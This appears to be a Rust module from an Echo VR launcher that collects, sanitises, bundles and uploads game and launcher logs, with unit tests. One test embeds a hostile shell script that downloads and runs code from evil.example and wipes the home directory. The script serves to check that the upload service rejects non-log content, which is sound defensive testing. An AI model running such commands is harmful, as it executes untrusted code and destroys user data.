//! What "Upload logs" sends: the launcher's own logs, Echo VR's (each installed version's
//! `_local/r14logs`), EchoXR's, plugins', and the Quest logs saved last. One plain-text
//! bundle (no archive, nothing to unpack), each file cut to its newest part and cleaned
//! so the upload service always takes a real log (it refuses anything that isn't plain
//! text: see `server/feed-bot/log_upload.py`).
//!
//! ```text
//! ECHOVR-LOGS 1
//! FILE launcher/EchoVR_Installer.log 183455
//! <exactly that many bytes>
//! FILE echo/pc-latest.r14-10-03-2026.log 52011
//! <...>
//! END
//! ```

use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use anyhow::{anyhow, Context, Result};

use super::launcher::store::InstalledVersion;
use super::paths;

/// Where the bundle goes.
pub const UPLOAD_URL: &str = "https://files.echovr.de/launcher/logs";
/// What the service takes at most: per file, files, all files' bytes, per line.
pub const MAX_FILE: usize = 8 << 20;
pub const MAX_FILES: usize = 24;
pub const MAX_TOTAL: usize = 32 << 20;
pub const MAX_LINE: usize = 16 << 10;
/// A run of base64 this long is left out (the service refuses one: that's how payloads,
/// and tokens, end up in text).
const MAX_BASE64_RUN: usize = 1024;

/// Echo VR's newest logs, across the installed versions, from the last two weeks.
const ECHO_FILES: usize = 5;
/// A plugin's newest logs per version.
const PLUGIN_FILES: usize = 3;
const RECENT: Duration = Duration::from_secs(14 * 24 * 3600);

/// The launcher's own logs, as `core::log` writes and rotates them.
const LAUNCHER_LOGS: [&str; 6] = [
    "EchoVR_Installer.log",
    "EchoVR_Installer.log.1",
    "play.log",
    "play.log.1",
    "admin-helper.log",
    "admin-helper.log.1",
];

/// Plugins' logs: their folder under the game's bin folder, and how their file names
/// start. The game's plugins live in `bin/win10/plugins` (the community update's
/// `dbgcore.dll` loads them); a plugin's entry comes with it.
pub const PLUGIN_LOGS: &[(&str, &str)] = &[];

/// Where a log is from (its folder in the bundle).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Kind {
    Launcher,
    EchoXr,
    Echo,
    Plugin,
    Quest,
}

impl Kind {
    pub const ALL: [Kind; 5] = [
        Kind::Launcher,
        Kind::EchoXr,
        Kind::Echo,
        Kind::Plugin,
        Kind::Quest,
    ];

    fn dir(self) -> &'static str {
        match self {
            Kind::Launcher => "launcher",
            Kind::EchoXr => "echoxr",
            Kind::Echo => "echo",
            Kind::Plugin => "plugin",
            Kind::Quest => "quest",
        }
    }

    /// Whose logs, for the consent dialog.
    pub fn label(self) -> &'static str {
        match self {
            Kind::Launcher => "the launcher",
            Kind::EchoXr => "EchoXR",
            Kind::Echo => "Echo VR",
            Kind::Plugin => "plugins",
            Kind::Quest => "your Quest",
        }
    }
}

/// One log to send.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Source {
    pub kind: Kind,
    /// Its name in the bundle: `[A-Za-z0-9._-]`, at most 100 characters.
    pub name: String,
    pub path: PathBuf,
    /// How much of it goes (its newest part, at most `MAX_FILE`).
    pub bytes: u64,
}

/// Pure: a file name as the service takes it.
pub fn bundle_name(name: &str) -> String {
    let clean: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else {
                '_'
            }
        })
        .collect();
    // Keep the end (the extension) when it's too long.
    let start = clean.len().saturating_sub(100);
    let clean = &clean[start..];
    if clean.is_empty() || clean.chars().all(|c| c == '.') {
        "log".into()
    } else {
        clean.to_string()
    }
}

fn modified(path: &Path) -> Option<SystemTime> {
    std::fs::metadata(path).and_then(|m| m.modified()).ok()
}

/// The non-empty files in `dir` whose names pass `keep`, newest first.
fn newest_in(dir: &Path, keep: impl Fn(&str) -> bool) -> Vec<(PathBuf, SystemTime)> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut files: Vec<(PathBuf, SystemTime)> = entries
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_ok_and(|t| t.is_file()))
        .filter(|e| keep(&e.file_name().to_string_lossy()))
        .filter(|e| e.metadata().is_ok_and(|m| m.len() > 0))
        .filter_map(|e| Some((e.path(), modified(&e.path())?)))
        .collect();
    files.sort_by_key(|f| std::cmp::Reverse(f.1));
    files
}

fn is_log(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    n.ends_with(".log") || n.ends_with(".txt")
}

fn source(kind: Kind, name: &str, path: PathBuf) -> Option<Source> {
    let len = std::fs::metadata(&path).ok()?.len();
    (len > 0).then(|| Source {
        kind,
        name: bundle_name(name),
        bytes: len.min(MAX_FILE as u64),
        path,
    })
}

/// Every log there is to send, by kind, at most `MAX_FILES`: from the launcher's log
/// folder `log_dir`, the installed versions, and the plugins in `plugin_logs`.
fn collect_from(
    log_dir: &Path,
    versions: &[InstalledVersion],
    plugin_logs: &[(&str, &str)],
    now: SystemTime,
) -> Vec<Source> {
    let recent = |t: &SystemTime| now.duration_since(*t).map_or(true, |age| age <= RECENT);
    let mut out: Vec<Source> = LAUNCHER_LOGS
        .iter()
        .filter_map(|n| source(Kind::Launcher, n, log_dir.join(n)))
        .collect();
    let present: Vec<&InstalledVersion> = versions.iter().filter(|v| v.present()).collect();
    for v in &present {
        let dir = v.bin_dir().join(super::echoxr::DIR);
        for n in ["launcher.log", "runtime.log"] {
            out.extend(source(Kind::EchoXr, &format!("{}.{n}", v.id), dir.join(n)));
        }
    }
    // Echo VR's newest, whichever version they're from.
    let mut echo: Vec<(&InstalledVersion, PathBuf, SystemTime)> = present
        .iter()
        .flat_map(|v| {
            let dir = Path::new(&v.root)
                .join(paths::ARENA_DIR)
                .join("_local/r14logs");
            newest_in(&dir, is_log)
                .into_iter()
                .map(move |(p, t)| (*v, p, t))
        })
        .filter(|(_, _, t)| recent(t))
        .collect();
    echo.sort_by_key(|e| std::cmp::Reverse(e.2));
    for (v, p, _) in echo.into_iter().take(ECHO_FILES) {
        let name = format!(
            "{}.{}",
            v.id,
            p.file_name().unwrap_or_default().to_string_lossy()
        );
        out.extend(source(Kind::Echo, &name, p));
    }
    for v in &present {
        for (folder, prefix) in plugin_logs {
            let dir = v.bin_dir().join(folder);
            let files = newest_in(&dir, |n| n.starts_with(prefix) && is_log(n));
            for (p, _) in files
                .into_iter()
                .filter(|(_, t)| recent(t))
                .take(PLUGIN_FILES)
            {
                let name = format!(
                    "{}.{}",
                    v.id,
                    p.file_name().unwrap_or_default().to_string_lossy()
                );
                out.extend(source(Kind::Plugin, &name, p));
            }
        }
    }
    // The Quest's logs as "Quest logs" saved them last (a folder each time).
    let quest = newest_in_dirs(&log_dir.join("quest")).filter(|(_, t)| recent(t));
    if let Some((dir, _)) = quest {
        let mut files: Vec<(PathBuf, SystemTime)> = std::fs::read_dir(&dir)
            .into_iter()
            .flatten()
            .filter_map(Result::ok)
            .flat_map(|e| newest_in(&e.path(), is_log))
            .collect();
        files.sort_by_key(|f| std::cmp::Reverse(f.1));
        for (p, _) in files.into_iter().take(ECHO_FILES) {
            let name = p
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .into_owned();
            out.extend(source(Kind::Quest, &name, p));
        }
    }
    out.truncate(MAX_FILES);
    out
}

/// The newest folder in `dir`.
fn newest_in_dirs(dir: &Path) -> Option<(PathBuf, SystemTime)> {
    std::fs::read_dir(dir)
        .ok()?
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
        .filter_map(|e| Some((e.path(), modified(&e.path())?)))
        .max_by_key(|(_, t)| *t)
}

/// Every log there is to send for these installed versions.
pub fn collect(versions: &[InstalledVersion]) -> Vec<Source> {
    collect_from(&paths::log_dir(), versions, PLUGIN_LOGS, SystemTime::now())
}

/// Pure: `text`'s newest part of at most `max` bytes, starting at a character, and at a
/// line when there is one.
fn tail_str(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut start = text.len() - max;
    while !text.is_char_boundary(start) {
        start += 1;
    }
    let cut = &text[start..];
    match cut.find('\n') {
        Some(i) if i + 1 < cut.len() => &cut[i + 1..],
        _ => cut,
    }
}

/// Pure: `bytes`' newest part of at most `max` bytes, starting at a line.
fn tail(bytes: &[u8], max: usize) -> &[u8] {
    if bytes.len() <= max {
        return bytes;
    }
    let cut = &bytes[bytes.len() - max..];
    match cut.iter().position(|&b| b == b'\n') {
        Some(i) => &cut[i + 1..],
        None => cut,
    }
}

/// Pure: whether `c` stays in a cleaned log: printable ASCII, tab and newline, and any
/// letter or digit. Everything else non-ASCII (controls, format and bidi characters,
/// private use, line separators, symbols) becomes `?`, so the service's text rules never
/// refuse a real log.
fn keeps(c: char) -> bool {
    matches!(c, '\t' | '\n' | ' '..='~') || (!c.is_ascii() && c.is_alphanumeric())
}

/// Pure: `bytes` as clean text: invalid UTF-8 replaced, a CR without LF a line break,
/// characters `keeps` doesn't keep as `?`, long base64 runs left out, and lines over
/// `MAX_LINE` bytes broken.
pub fn sanitize(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    let mut out = String::with_capacity(text.len());
    let mut run = String::new();
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        let c = match c {
            '\r' if chars.peek() == Some(&'\n') => '\r',
            '\r' => '\n',
            c if keeps(c) => c,
            _ => '?',
        };
        if c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=') {
            run.push(c);
            continue;
        }
        flush_run(&mut out, &mut run);
        out.push(c);
    }
    flush_run(&mut out, &mut run);
    break_lines(&out)
}

/// Appends a run of base64 characters, or a note in its place when it's long.
fn flush_run(out: &mut String, run: &mut String) {
    if run.len() >= MAX_BASE64_RUN {
        out.push_str(&format!("[{} base64 characters left out]", run.len()));
    } else {
        out.push_str(run);
    }
    run.clear();
}

/// Pure: `text` with every line longer than `MAX_LINE` bytes broken (at characters).
fn break_lines(text: &str) -> String {
    if text.split('\n').all(|l| l.len() <= MAX_LINE) {
        return text.to_string();
    }
    let mut out = String::with_capacity(text.len() + 64);
    for (i, l) in text.split('\n').enumerate() {
        if i > 0 {
            out.push('\n');
        }
        let mut n = 0;
        for c in l.chars() {
            if n + c.len_utf8() > MAX_LINE {
                out.push('\n');
                n = 0;
            }
            out.push(c);
            n += c.len_utf8();
        }
    }
    out
}

/// The bundle of `sources`: each file's newest part, cleaned, all of them within
/// `MAX_TOTAL` (smaller files first, so the big ones share what's left).
pub fn bundle(sources: &[Source]) -> Result<Vec<u8>> {
    let mut order: Vec<usize> = (0..sources.len()).collect();
    order.sort_by_key(|&i| sources[i].bytes);
    let mut budget = MAX_TOTAL;
    let mut texts: Vec<Option<String>> = vec![None; sources.len()];
    for (k, &i) in order.iter().enumerate() {
        let share = (budget / (order.len() - k)).min(MAX_FILE);
        let Ok(bytes) = std::fs::read(&sources[i].path) else {
            continue;
        };
        // Cleaning can grow it (a note for a base64 run): cut again, at a character.
        let clean = sanitize(tail(&bytes, share));
        let text = tail_str(&clean, share).to_string();
        budget -= text.len();
        texts[i] = Some(text);
    }
    let mut out = b"ECHOVR-LOGS 1\n".to_vec();
    for (s, text) in sources.iter().zip(texts) {
        let Some(text) = text.filter(|t| !t.is_empty()) else {
            continue;
        };
        out.extend(format!("FILE {}/{} {}\n", s.kind.dir(), s.name, text.len()).as_bytes());
        out.extend(text.as_bytes());
    }
    out.extend(b"END\n");
    Ok(out)
}

/// Where the bundle goes: debug builds may point elsewhere (`ECHOVR_LOG_UPLOAD_URL`) to
/// try a local service.
fn upload_url() -> String {
    if cfg!(debug_assertions) {
        if let Ok(url) = std::env::var("ECHOVR_LOG_UPLOAD_URL") {
            return url;
        }
    }
    UPLOAD_URL.into()
}

/// Sends `bundle`; the reference the service gives it, or what went wrong in plain words.
pub fn upload(bundle: Vec<u8>) -> Result<String> {
    let url = upload_url();
    let (status, body) = super::http::block_on(async {
        let resp = super::http::client()
            .post(&url)
            // Sending, then the service's checks (its file type check takes a while).
            .timeout(Duration::from_secs(600))
            .header("Content-Type", "text/plain; charset=utf-8")
            .body(bundle)
            .send()
            .await
            .context("Couldn't reach the log upload service")?;
        let status = resp.status().as_u16();
        Ok::<_, anyhow::Error>((status, resp.text().await.unwrap_or_default()))
    })?;
    let json: serde_json::Value = serde_json::from_str(&body).unwrap_or_default();
    let field = |k: &str| json.get(k).and_then(|v| v.as_str()).map(str::to_string);
    match status {
        200 | 201 => field("code")
            .filter(|c| c.len() <= 32 && c.chars().all(|ch| ch.is_ascii_alphanumeric()))
            .ok_or_else(|| anyhow!("The log upload service answered without a reference.")),
        429 => Err(anyhow!(
            "Too many uploads from your network: try again in an hour."
        )),
        413 => Err(anyhow!("The logs are too large for the upload service.")),
        503 => Err(anyhow!(
            "The log upload service is busy right now: try again in a few minutes."
        )),
        _ => Err(anyhow!(
            "The log upload service didn't take the logs ({status}){}",
            field("error")
                .filter(|e| e.len() < 200)
                .map(|e| format!(": {e}"))
                .unwrap_or_default()
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names_files_safely() {
        assert_eq!(bundle_name("EchoVR_Installer.log"), "EchoVR_Installer.log");
        assert_eq!(
            bundle_name("[r14]-[10-03-2026]_[14-22-31]_1234.log"),
            "_r14_-_10-03-2026___14-22-31__1234.log"
        );
        assert_eq!(bundle_name("../../etc/passwd"), ".._.._etc_passwd");
        assert_eq!(bundle_name(".."), "log");
        assert_eq!(bundle_name(""), "log");
        let long = format!("{}.log", "a".repeat(200));
        assert_eq!(bundle_name(&long).len(), 100);
        assert!(bundle_name(&long).ends_with(".log"));
    }

    #[test]
    fn cleans_what_the_service_refuses() {
        // Escape sequences, bidi overrides, zero-width and private-use characters, NUL,
        // a bare CR and invalid UTF-8; letters stay.
        let dirty = "a\x1b[31mred\u{202E}x\u{200B}y\u{E000}\0z\rnext Jürgen 日本\n".as_bytes();
        let mut dirty = dirty.to_vec();
        dirty.extend(b"\xff\xfe end\r\n");
        let clean = sanitize(&dirty);
        assert_eq!(clean, "a?[31mred?x?y??z\nnext Jürgen 日本\n?? end\r\n");
        assert!(clean.chars().all(|c| c == '\r' || keeps(c)));
    }

    #[test]
    fn leaves_long_base64_out_and_breaks_long_lines() {
        let blob = "QUJD".repeat(300);
        let clean = sanitize(format!("token {blob} end\n").as_bytes());
        assert_eq!(clean, "token [1200 base64 characters left out] end\n");
        let short = "QUJD".repeat(10);
        assert_eq!(sanitize(short.as_bytes()), short);
        let long = "a b ".repeat(MAX_LINE);
        let clean = sanitize(long.as_bytes());
        assert!(clean.split('\n').all(|l| l.len() <= MAX_LINE));
        assert_eq!(clean.replace('\n', ""), long);
    }

    #[test]
    fn keeps_the_newest_part() {
        assert_eq!(tail(b"one\ntwo\nthree\n", 100), b"one\ntwo\nthree\n");
        assert_eq!(tail(b"one\ntwo\nthree\n", 9), b"three\n");
        assert_eq!(tail_str("one\ntwo\nthree\n", 9), "three\n");
        // No line to start at, and a character cut through: from the next character.
        assert_eq!(tail_str("ääää", 5), "ää");
    }

    fn write(path: &Path, text: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    #[test]
    fn collects_every_kind_and_bundles_them() {
        let dir = tempfile::tempdir().unwrap();
        let logs = dir.path().join("logs");
        write(
            &logs.join("EchoVR_Installer.log"),
            "2026-10-03T10:00:00Z  INFO hi\n",
        );
        write(&logs.join("play.log"), "");
        let root = dir.path().join("pc");
        let bin = root.join(paths::ARENA_DIR).join("bin/win10");
        write(&bin.join("echovr.exe"), "MZ");
        write(&bin.join("EchoXR/launcher.log"), "===== launch =====\n");
        let r14 = root.join(paths::ARENA_DIR).join("_local/r14logs");
        for i in 0..7 {
            write(
                &r14.join(format!("[r14]-{i}.log")),
                &format!("[10-03-2026] [10:00:0{i}]: x\n"),
            );
        }
        write(&bin.join("plugins/myplugin-1.log"), "plugin says hi\n");
        write(&bin.join("plugins/other.log"), "not ours\n");
        write(
            &logs.join("quest/2026-10-03_10-00-00/r14logs/a.log"),
            "quest\n",
        );
        let v = InstalledVersion {
            id: "pc-latest".into(),
            root: paths::normalize(&root.to_string_lossy()),
            ..Default::default()
        };
        let sources = collect_from(&logs, &[v], &[("plugins", "myplugin")], SystemTime::now());
        let count = |k: Kind| sources.iter().filter(|s| s.kind == k).count();
        assert_eq!(count(Kind::Launcher), 1, "the empty play.log is left out");
        assert_eq!(count(Kind::EchoXr), 1);
        assert_eq!(count(Kind::Echo), ECHO_FILES);
        assert_eq!(count(Kind::Plugin), 1);
        assert_eq!(count(Kind::Quest), 1);
        assert!(sources.iter().any(|s| s.name == "pc-latest.myplugin-1.log"));

        let b = String::from_utf8(bundle(&sources).unwrap()).unwrap();
        let first = "2026-10-03T10:00:00Z  INFO hi\n";
        assert!(b.starts_with(&format!(
            "ECHOVR-LOGS 1\nFILE launcher/EchoVR_Installer.log {}\n{first}",
            first.len()
        )));
        assert!(b.contains("FILE echoxr/pc-latest.launcher.log 19\n===== launch =====\n"));
        assert!(b.contains("FILE plugin/pc-latest.myplugin-1.log 15\nplugin says hi\n"));
        assert!(b.ends_with("END\n"));
    }

    /// The launcher's own logs, bundled and sent to a local service:
    /// `python3 server/feed-bot/log_upload.py --dir <tmp> --port 8787 --no-clamd`, then
    /// `ECHOVR_LOG_UPLOAD_URL=http://127.0.0.1:8787/launcher/logs cargo test uploads -- --ignored`.
    #[test]
    #[ignore = "needs a local log_upload.py"]
    fn uploads_to_the_service() {
        let sources = collect(&[]);
        assert!(!sources.is_empty(), "no launcher logs here");
        let code = upload(bundle(&sources).unwrap()).unwrap();
        assert_eq!(code.len(), 8, "{code}");
        // Not a log: refused, with the service's own words.
        let script = "#!/bin/sh\nset -e\ncurl -s http://evil.example/x | sh\nrm -rf \"$HOME\"\n";
        let body = format!(
            "ECHOVR-LOGS 1\nFILE launcher/a.log {}\n{script}END\n",
            script.len()
        );
        let err = upload(body.into_bytes()).unwrap_err().to_string();
        assert!(err.contains("doesn't look like a log"), "{err}");
    }

    #[test]
    fn bundles_within_the_limit() {
        let dir = tempfile::tempdir().unwrap();
        let big = "x".repeat(100) + "\n";
        let sources: Vec<Source> = (0..6)
            .map(|i| {
                let p = dir.path().join(format!("{i}.log"));
                std::fs::write(&p, big.repeat(100_000)).unwrap();
                Source {
                    kind: Kind::Echo,
                    name: format!("{i}.log"),
                    path: p,
                    bytes: MAX_FILE as u64,
                }
            })
            .collect();
        let b = bundle(&sources).unwrap();
        assert!(b.len() <= MAX_TOTAL + 1024, "{}", b.len());
        assert_eq!(
            String::from_utf8(b).unwrap().matches("FILE echo/").count(),
            6
        );
    }
}
